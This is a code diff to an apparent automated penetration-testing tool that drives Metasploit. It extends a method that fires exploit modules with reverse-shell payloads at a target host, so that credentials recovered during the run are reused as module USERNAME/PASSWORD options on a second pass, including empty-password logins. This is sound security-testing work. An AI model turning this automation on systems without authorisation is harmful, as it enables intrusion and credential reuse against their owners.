@@ -662,7 +662,7 @@ class MsfClient:
                 break
         return data
 
-    def fire(self, candidate, host, rhost, port):
+    def fire(self, candidate, host, rhost, port, credential=None):
         """Detonate the module against rhost with a single selected reverse payload.
         Returns (session, status, detail). status is one of:
           session    - a session opened
@@ -702,6 +702,24 @@ class MsfClient:
             fails = _apply_options(exploit, [("RHOSTS", rhost), ("RHOST", rhost)])
             if port:
                 fails += _apply_options(exploit, [("RPORT", int(port))])
+            if credential is not None:
+                # Second-pass re-fire with a credential the run recovered. Set the
+                # module's declared USERNAME/PASSWORD from it; the password is set
+                # even when empty, since an unset (nil) password is not the same as
+                # an explicit empty string and blocks the empty-password login. If
+                # the module declares no credential option, the credential cannot
+                # help, so block rather than waste an execute.
+                cred_sets = []
+                for opt in set(exploit.options):
+                    if _is_user_opt(opt) and credential.username:
+                        cred_sets.append((opt, credential.username))
+                    elif _is_pass_opt(opt):
+                        cred_sets.append((opt, credential.password))
+                if not cred_sets:
+                    return self._blocked(
+                        candidate, rhost,
+                        "module declares no credential option to reuse")
+                fails += _apply_options(exploit, cred_sets)
             fails += _apply_options(payload, [("LHOST", lhost),
                                               ("LPORT", int(lport))])
             # Required exploit options with no default that are still unset, minus
@@ -739,8 +757,9 @@ class MsfClient:
             self._activity("fire", f"execute {candidate.module} "
                                    f"payload={payload_name} LHOST={lhost} "
                                    f"LPORT={lport} @ {rhost}")
-            logger.info("fire %s @ %s:%s payload=%s LHOST=%s LPORT=%s",
-                        candidate.module, rhost, port, payload_name, lhost, lport)
+            logger.info("fire %s @ %s:%s payload=%s LHOST=%s LPORT=%s%s",
+                        candidate.module, rhost, port, payload_name, lhost, lport,
+                        f" cred={credential.username}" if credential else "")
             # snapshot sessions present before we fire so the matcher can tell a
             # session THIS fire opened from one already running (concurrent fires).
             try:
